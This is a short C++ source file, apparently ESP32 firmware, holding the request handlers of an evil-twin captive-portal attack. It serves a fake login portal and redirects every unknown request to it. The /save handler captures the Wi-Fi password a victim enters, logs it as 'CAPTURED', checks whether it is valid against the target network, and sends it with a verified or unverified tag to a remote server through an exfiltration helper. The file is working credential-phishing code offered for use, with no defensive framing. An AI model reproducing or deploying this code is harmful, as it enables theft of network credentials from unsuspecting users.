#include "handlers.h"
#include "exfil.h"
#include "validate.h"
#include "config.h"

void handleRoot(WebServer &server) {
  server.send_P(200, "text/html", PORTAL_HTML);
}

void handleSave(WebServer &server) {
  String password = server.arg("password");
  Serial.println("[+] CAPTURED: " TARGET_SSID " : " + password);

  bool valid = checkPassword(password);
  Serial.println(valid ? "[+] Password is VALID" : "[-] Password invalid (or AP unreachable)");

  sendToServer(TARGET_SSID, password + (valid ? " [VERIFIED]" : " [unverified]"));

  server.send_P(200, "text/html", SUCCESS_HTML);
}

void handleRedirect(WebServer &server) {
  server.sendHeader("Location", "http://192.168.4.1/", true);
  server.send(302, "text/plain", "");
}

void registerRoutes(WebServer &server) {
  server.on("/", handleRoot);
  server.on("/save", HTTP_POST, handleSave);
  server.onNotFound([]() { handleRedirect(server); });
}
